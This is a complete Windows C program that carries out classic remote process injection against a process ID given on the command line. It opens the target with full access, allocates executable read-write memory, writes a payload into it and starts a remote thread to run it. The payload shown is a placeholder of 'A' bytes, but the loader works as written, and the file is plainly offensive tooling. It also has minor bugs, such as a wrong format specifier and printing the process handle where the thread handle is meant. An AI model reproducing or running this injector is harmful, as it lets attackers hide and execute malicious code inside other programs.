#include <Windows.h>
#include <stdio.h>
#include "processInjection.h"

int main(int argc, char* argv[])
{  
    PVOID rBuffer = NULL;
    DWORD dwPID = NULL, dwTID = NULL;
    HANDLE hProcess = NULL, hThread = NULL;

    unsigned char payload[] = "\x41\x41\x41\x41\x41\x41";
    size_t payloadSize = sizeof(payload);

    dwPID = parsePidParam(argc, argv);
    if (dwPID == NULL) 
    {
        printHelp();
        return EXIT_FAILURE;
    }
    else
    {
        printf("PID: %i", dwPID);
    }

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (hProcess == NULL)
    {
        printf("Failed to open process, error: 0x%lx", GetLastError());
        return EXIT_FAILURE;
    }

    printf("Got a handle to the process\n\\---0x%p\n", hProcess);

    rBuffer = VirtualAllocEx(hProcess, NULL, payloadSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    printf("Allocated %zd-bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", payloadSize);

    WriteProcessMemory(hProcess, rBuffer, payload, payloadSize, NULL);
    printf("Payload written to the process memory");

    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);
    if (hThread == NULL)
    {
        printf("Failed to create thread, error: %s", GetLastError());
        return EXIT_FAILURE;
    }
    printf("Got a handle to the newly-created thread (%ld)\n\\---0x%p\n", dwTID, hProcess);

    printf("Waiting for thread to finish executing\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("Thread finished executing, cleaning up\n");

    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("Finished");

    return EXIT_SUCCESS;
}

void printHelp()
{
    printf("Usage processInjection.exe -p PID\n");
    printf("\tPID\tProcess ID\n");
}

DWORD parsePidParam(int argc, char* argv[])
{
    for (int i = 0; i < argc; i++)
    {
        if (!strcmp("-p", argv[i]) && i < argc - 1)
        {
            return atoi(argv[i + 1]);
        }
    }

    return NULL;
}